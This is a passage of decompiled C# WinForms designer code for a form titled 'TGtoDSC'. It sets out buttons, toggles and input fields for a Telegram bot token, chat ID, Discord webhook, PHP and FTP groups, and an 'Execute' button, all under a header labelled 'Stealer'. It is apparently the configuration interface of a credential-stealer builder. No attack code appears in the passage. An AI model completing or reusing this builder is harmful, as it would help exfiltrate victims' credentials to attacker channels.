            this.chkDisc.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
            this.chkDisc.BackColor = System.Drawing.Color.Transparent;
            this.chkDisc.Location = new System.Drawing.Point(33, 608);
            this.chkDisc.Name = "chkDisc";
            this.chkDisc.OffFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            this.chkDisc.OnFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            this.chkDisc.Size = new System.Drawing.Size(50, 19);
            this.chkDisc.Style = JCS.ToggleSwitch.ToggleSwitchStyle.OSX;
            this.chkDisc.TabIndex = 66;
            this.chkDisc.CheckedChanged += new JCS.ToggleSwitch.CheckedChangedDelegate(chkDisc_CheckedChanged);
            this.label11.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
            this.label11.AutoSize = true;
            this.label11.Location = new System.Drawing.Point(201, 611);
            this.label11.Name = "label11";
            this.label11.Size = new System.Drawing.Size(60, 13);
            this.label11.TabIndex = 65;
            this.label11.Text = "Telegram";
            this.chkTel.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
            this.chkTel.BackColor = System.Drawing.Color.Transparent;
            this.chkTel.Location = new System.Drawing.Point(145, 608);
            this.chkTel.Name = "chkTel";
            this.chkTel.OffFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            this.chkTel.OnFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            this.chkTel.Size = new System.Drawing.Size(50, 19);
            this.chkTel.Style = JCS.ToggleSwitch.ToggleSwitchStyle.OSX;
            this.chkTel.TabIndex = 64;
            this.chkTel.CheckedChanged += new JCS.ToggleSwitch.CheckedChangedDelegate(chkTel_CheckedChanged);
            this.btnThelp.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
            this.btnThelp.BackColor = System.Drawing.Color.Transparent;
            bloom37.Name = "DownGradient1";
            bloom37.Value = System.Drawing.Color.FromArgb(45, 65, 95);
            bloom38.Name = "DownGradient2";
            bloom38.Value = System.Drawing.Color.FromArgb(65, 85, 115);
            bloom39.Name = "NoneGradient1";
            bloom39.Value = System.Drawing.Color.FromArgb(65, 85, 115);
            bloom40.Name = "NoneGradient2";
            bloom40.Value = System.Drawing.Color.FromArgb(45, 65, 95);
            bloom41.Name = "Shine1";
            bloom41.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
            bloom42.Name = "Shine2A";
            bloom42.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
            bloom43.Name = "Shine2B";
            bloom43.Value = System.Drawing.Color.Transparent;
            bloom44.Name = "Shine3";
            bloom44.Value = System.Drawing.Color.FromArgb(20, 255, 255, 255);
            bloom45.Name = "TextShade";
            bloom45.Value = System.Drawing.Color.FromArgb(50, 0, 0, 0);
            bloom46.Name = "Text";
            bloom46.Value = System.Drawing.Color.White;
            bloom47.Name = "Glow";
            bloom47.Value = System.Drawing.Color.FromArgb(10, 255, 255, 255);
            bloom48.Name = "Border";
            bloom48.Value = System.Drawing.Color.FromArgb(20, 40, 70);
            bloom49.Name = "Corners";
            bloom49.Value = System.Drawing.Color.FromArgb(20, 40, 70);
            this.btnThelp.Colors = new Bloom[13]
            {
                bloom37, bloom38, bloom39, bloom40, bloom41, bloom42, bloom43, bloom44, bloom45, bloom46,
                bloom47, bloom48, bloom49
            };
            this.btnThelp.Customization = "X0Et/3NVQf9zVUH/X0Et/////x7///8e////AP///xQAAAAy/////////wpGKBT/RigU/w==";
            this.btnThelp.Font = new System.Drawing.Font("Verdana", 8f);
            this.btnThelp.Image = null;
            this.btnThelp.Location = new System.Drawing.Point(145, 568);
            this.btnThelp.Name = "btnThelp";
            this.btnThelp.NoRounding = false;
            this.btnThelp.Size = new System.Drawing.Size(108, 30);
            this.btnThelp.TabIndex = 62;
            this.btnThelp.Text = "Telegram Help";
            this.btnThelp.Transparent = true;
            this.btnThelp.Click += new System.EventHandler(btnThelp_Click);
            this.btnDHelp.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
            this.btnDHelp.BackColor = System.Drawing.Color.Transparent;
            bloom50.Name = "DownGradient1";
            bloom50.Value = System.Drawing.Color.FromArgb(45, 65, 95);
            bloom51.Name = "DownGradient2";
            bloom51.Value = System.Drawing.Color.FromArgb(65, 85, 115);
            bloom52.Name = "NoneGradient1";
            bloom52.Value = System.Drawing.Color.FromArgb(65, 85, 115);
            bloom53.Name = "NoneGradient2";
            bloom53.Value = System.Drawing.Color.FromArgb(45, 65, 95);
            bloom54.Name = "Shine1";
            bloom54.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
            bloom55.Name = "Shine2A";
            bloom55.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
            bloom56.Name = "Shine2B";
            bloom56.Value = System.Drawing.Color.Transparent;
            bloom57.Name = "Shine3";
            bloom57.Value = System.Drawing.Color.FromArgb(20, 255, 255, 255);
            bloom58.Name = "TextShade";
            bloom58.Value = System.Drawing.Color.FromArgb(50, 0, 0, 0);
            bloom59.Name = "Text";
            bloom59.Value = System.Drawing.Color.White;
            bloom60.Name = "Glow";
            bloom60.Value = System.Drawing.Color.FromArgb(10, 255, 255, 255);
            bloom61.Name = "Border";
            bloom61.Value = System.Drawing.Color.FromArgb(20, 40, 70);
            bloom62.Name = "Corners";
            bloom62.Value = System.Drawing.Color.FromArgb(20, 40, 70);
            this.btnDHelp.Colors = new Bloom[13]
            {
                bloom50, bloom51, bloom52, bloom53, bloom54, bloom55, bloom56, bloom57, bloom58, bloom59,
                bloom60, bloom61, bloom62
            };
            this.btnDHelp.Customization = "X0Et/3NVQf9zVUH/X0Et/////x7///8e////AP///xQAAAAy/////////wpGKBT/RigU/w==";
            this.btnDHelp.Font = new System.Drawing.Font("Verdana", 8f);
            this.btnDHelp.Image = null;
            this.btnDHelp.Location = new System.Drawing.Point(33, 568);
            this.btnDHelp.Name = "btnDHelp";
            this.btnDHelp.NoRounding = false;
            this.btnDHelp.Size = new System.Drawing.Size(108, 30);
            this.btnDHelp.TabIndex = 61;
            this.btnDHelp.Text = "Discord Help";
            this.btnDHelp.Transparent = true;
            this.btnDHelp.Click += new System.EventHandler(btnDHelp_Click);
            this.btnExec.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
            bloom63.Name = "DownGradient1";
            bloom63.Value = System.Drawing.Color.FromArgb(215, 215, 215);
            bloom64.Name = "DownGradient2";
            bloom64.Value = System.Drawing.Color.FromArgb(235, 235, 235);
            bloom65.Name = "NoneGradient1";
            bloom65.Value = System.Drawing.Color.FromArgb(235, 235, 235);
            bloom66.Name = "NoneGradient2";
            bloom66.Value = System.Drawing.Color.FromArgb(215, 215, 215);
            bloom67.Name = "NoneGradient3";
            bloom67.Value = System.Drawing.Color.FromArgb(252, 252, 252);
            bloom68.Name = "NoneGradient4";
            bloom68.Value = System.Drawing.Color.FromArgb(242, 242, 242);
            bloom69.Name = "Glow";
            bloom69.Value = System.Drawing.Color.FromArgb(50, 255, 255, 255);
            bloom70.Name = "TextShade";
            bloom70.Value = System.Drawing.Color.White;
            bloom71.Name = "Text";
            bloom71.Value = System.Drawing.Color.FromArgb(80, 80, 80);
            bloom72.Name = "Border1";
            bloom72.Value = System.Drawing.Color.White;
            bloom73.Name = "Border2";
            bloom73.Value = System.Drawing.Color.FromArgb(180, 180, 180);
            this.btnExec.Colors = new Bloom[11]
            {
                bloom63, bloom64, bloom65, bloom66, bloom67, bloom68, bloom69, bloom70, bloom71, bloom72,
                bloom73
            };
            this.btnExec.Customization = "19fX/+vr6//r6+v/19fX//z8/P/y8vL/////Mv////9QUFD//////7S0tP8=";
            this.btnExec.Font = new System.Drawing.Font("Verdana", 8f);
            this.btnExec.Image = null;
            this.btnExec.Location = new System.Drawing.Point(631, 588);
            this.btnExec.Name = "btnExec";
            this.btnExec.NoRounding = false;
            this.btnExec.Size = new System.Drawing.Size(177, 39);
            this.btnExec.TabIndex = 60;
            this.btnExec.Text = "Execute";
            this.btnExec.Transparent = false;
            this.btnExec.Click += new System.EventHandler(btnExec_Click);
            this.label3.AutoSize = true;
            this.label3.BackColor = System.Drawing.Color.Transparent;
            this.label3.Font = new System.Drawing.Font("Verdana", 9.75f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
            this.label3.ForeColor = System.Drawing.Color.Black;
            this.label3.Location = new System.Drawing.Point(37, 15);
            this.label3.Name = "label3";
            this.label3.Size = new System.Drawing.Size(60, 16);
            this.label3.TabIndex = 53;
            this.label3.Text = "Stealer";
            this.pictureBox1.BackColor = System.Drawing.Color.Transparent;
            this.pictureBox1.Image = (System.Drawing.Image)resources.GetObject("pictureBox1.Image");
            this.pictureBox1.Location = new System.Drawing.Point(0, 0);
            this.pictureBox1.Name = "pictureBox1";
            this.pictureBox1.Size = new System.Drawing.Size(51, 48);
            this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.pictureBox1.TabIndex = 52;
            this.pictureBox1.TabStop = false;
            this.studioButton5.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
            this.studioButton5.BackColor = System.Drawing.Color.Transparent;
            bloom74.Name = "DownGradient1";
            bloom74.Value = System.Drawing.Color.FromArgb(45, 65, 95);
            bloom75.Name = "DownGradient2";
            bloom75.Value = System.Drawing.Color.FromArgb(65, 85, 115);
            bloom76.Name = "NoneGradient1";
            bloom76.Value = System.Drawing.Color.FromArgb(65, 85, 115);
            bloom77.Name = "NoneGradient2";
            bloom77.Value = System.Drawing.Color.FromArgb(45, 65, 95);
            bloom78.Name = "Shine1";
            bloom78.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
            bloom79.Name = "Shine2A";
            bloom79.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
            bloom80.Name = "Shine2B";
            bloom80.Value = System.Drawing.Color.Transparent;
            bloom81.Name = "Shine3";
            bloom81.Value = System.Drawing.Color.FromArgb(20, 255, 255, 255);
            bloom82.Name = "TextShade";
            bloom82.Value = System.Drawing.Color.FromArgb(50, 0, 0, 0);
            bloom83.Name = "Text";
            bloom83.Value = System.Drawing.Color.White;
            bloom84.Name = "Glow";
            bloom84.Value = System.Drawing.Color.FromArgb(10, 255, 255, 255);
            bloom85.Name = "Border";
            bloom85.Value = System.Drawing.Color.FromArgb(20, 40, 70);
            bloom86.Name = "Corners";
            bloom86.Value = System.Drawing.Color.FromArgb(20, 40, 70);
            this.studioButton5.Colors = new Bloom[13]
            {
                bloom74, bloom75, bloom76, bloom77, bloom78, bloom79, bloom80, bloom81, bloom82, bloom83,
                bloom84, bloom85, bloom86
            };
            this.studioButton5.Customization = "X0Et/3NVQf9zVUH/X0Et/////x7///8e////AP///xQAAAAy/////////wpGKBT/RigU/w==";
            this.studioButton5.Font = new System.Drawing.Font("Verdana", 8f);
            this.studioButton5.Image = null;
            this.studioButton5.Location = new System.Drawing.Point(812, -6);
            this.studioButton5.Name = "studioButton5";
            this.studioButton5.NoRounding = false;
            this.studioButton5.Size = new System.Drawing.Size(13, 30);
            this.studioButton5.TabIndex = 51;
            this.studioButton5.Transparent = true;
            this.studioButton5.Click += new System.EventHandler(studioButton5_Click);
            this.GroupTG.Controls.Add(this.txtToken);
            this.GroupTG.Controls.Add(this.txtID);
            this.GroupTG.Controls.Add(this.label1);
            this.GroupTG.Controls.Add(this.label2);
            this.GroupTG.Enabled = false;
            this.GroupTG.Location = new System.Drawing.Point(33, 48);
            this.GroupTG.Name = "GroupTG";
            this.GroupTG.Size = new System.Drawing.Size(775, 123);
            this.GroupTG.TabIndex = 58;
            this.GroupTG.TabStop = false;
            this.GroupTG.Text = "Telegram";
            this.txtToken.Enabled = false;
            this.txtToken.Location = new System.Drawing.Point(201, 30);
            this.txtToken.Multiline = true;
            this.txtToken.Name = "txtToken";
            this.txtToken.Size = new System.Drawing.Size(454, 30);
            this.txtToken.TabIndex = 47;
            this.txtID.Enabled = false;
            this.txtID.Location = new System.Drawing.Point(201, 76);
            this.txtID.Multiline = true;
            this.txtID.Name = "txtID";
            this.txtID.Size = new System.Drawing.Size(454, 30);
            this.txtID.TabIndex = 48;
            this.label1.AutoSize = true;
            this.label1.Location = new System.Drawing.Point(131, 47);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(46, 13);
            this.label1.TabIndex = 54;
            this.label1.Text = "Token:";
            this.label2.AutoSize = true;
            this.label2.Location = new System.Drawing.Point(120, 93);
            this.label2.Name = "label2";
            this.label2.Size = new System.Drawing.Size(57, 13);
            this.label2.TabIndex = 55;
            this.label2.Text = "Chat ID:";
            this.GroupDisc.Controls.Add(this.txtHook);
            this.GroupDisc.Controls.Add(this.label5);
            this.GroupDisc.Enabled = false;
            this.GroupDisc.Location = new System.Drawing.Point(33, 171);
            this.GroupDisc.Name = "GroupDisc";
            this.GroupDisc.Size = new System.Drawing.Size(775, 102);
            this.GroupDisc.TabIndex = 59;
            this.GroupDisc.TabStop = false;
            this.GroupDisc.Text = "Discord";
            this.txtHook.Enabled = false;
            this.txtHook.Location = new System.Drawing.Point(204, 36);
            this.txtHook.Multiline = true;
            this.txtHook.Name = "txtHook";
            this.txtHook.Size = new System.Drawing.Size(454, 30);
            this.txtHook.TabIndex = 50;
            this.label5.AutoSize = true;
            this.label5.Location = new System.Drawing.Point(116, 53);
            this.label5.Name = "label5";
            this.label5.Size = new System.Drawing.Size(64, 13);
            this.label5.TabIndex = 57;
            this.label5.Text = "Webhook:";
            base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
            base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            base.ClientSize = new System.Drawing.Size(838, 652);
            base.Controls.Add(this.primeTheme1);
            base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
            base.Name = "TGtoDSC";
            base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "TGtoDSC";
            base.TransparencyKey = System.Drawing.Color.Fuchsia;
            base.Load += new System.EventHandler(TGtoDSC_Load);
            this.primeTheme1.ResumeLayout(false);
            this.primeTheme1.PerformLayout();
            this.GroupPHP.ResumeLayout(false);
            this.GroupPHP.PerformLayout();
            this.GroupFTP.ResumeLayout(false);
            this.GroupFTP.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)this.pictureBox1).EndInit();
            this.GroupTG.ResumeLayout(false);
            this.GroupTG.PerformLayout();
            this.GroupDisc.ResumeLayout(false);
            this.GroupDisc.PerformLayout();
            base.ResumeLayout(false);
        }
    }
}
